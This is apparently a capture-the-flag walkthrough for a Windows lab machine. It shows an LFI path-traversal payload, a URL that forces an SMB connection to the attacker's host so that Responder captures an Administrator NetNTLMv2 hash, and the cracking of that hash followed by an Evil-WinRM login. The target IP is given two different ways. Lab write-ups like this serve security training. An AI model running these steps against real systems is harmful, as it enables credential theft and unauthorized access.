Enumeration
We begin by scanning the host for open ports and running services using Nmap:


nmap -p- --min-rate 1000 -sV 10.129.128.223
Nmap detects that the machine is running Windows with an Apache web server on port 80 and WinRM on port 5985.

Website Enumeration
Accessing http://[target ip] redirects to http://unika.htb. We add an entry to the /etc/hosts file to resolve this domain:


echo "10.129.128.223 unika.htb" | sudo tee -a /etc/hosts
The website presents a web design business landing page with a language selection option. Changing the language reveals a potential Local File Inclusion (LFI) vulnerability via the page parameter.

Exploiting the LFI Vulnerability
We test the LFI vulnerability by accessing common system files:


http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
The contents of the hosts file are displayed, confirming the vulnerability.

Capturing the Challenge with Responder
We exploit this vulnerability to include a file on our attacker machine via SMB, capturing the NetNTLMv2 hash. We use Responder to set up a malicious SMB server:


sudo responder -I tun0
Accessing the following URL forces the server to connect to our machine:


http://unika.htb/?page=//10.10.14.25/somefile
Responder captures the NetNTLMv2 hash of the Administrator user.

Cracking the Hash
We use John the Ripper to crack the captured hash:


john -w=/usr/share/wordlists/rockyou.txt hash.txt
The password for the Administrator user is cracked: badminton.

Connecting via WinRM
We use Evil-WinRM to connect to the WinRM service with the obtained credentials:


evil-winrm -i 10.129.136.91 -u administrator -p badminton
The flag is located in C:\Users\mike\Desktop\flag.txt.

Congratulations! You can now view the contents of the flag.txt file.


type C:\Users\mike\Desktop\flag.txt
